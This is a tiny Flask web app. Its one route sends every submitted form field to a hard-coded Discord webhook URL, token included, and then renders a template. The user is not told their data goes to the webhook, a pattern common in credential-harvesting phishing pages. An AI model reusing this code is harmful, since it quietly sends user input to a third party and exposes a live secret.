import requests
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    
    
    if request.method == 'POST':
        a = request.form
        requests.post("https://discord.com/api/webhooks/1040584398619295756/PZt9A0VhIzKJzvbeBhB0oMJx5Cd7lnPNzXcr1M9O8OsUpxRwtBRWtrxdAMm_4KbmozUD", data={"content":a})
        return render_template('base.html', a=a)
    else:
        return render_template('base.html', a=None)

    


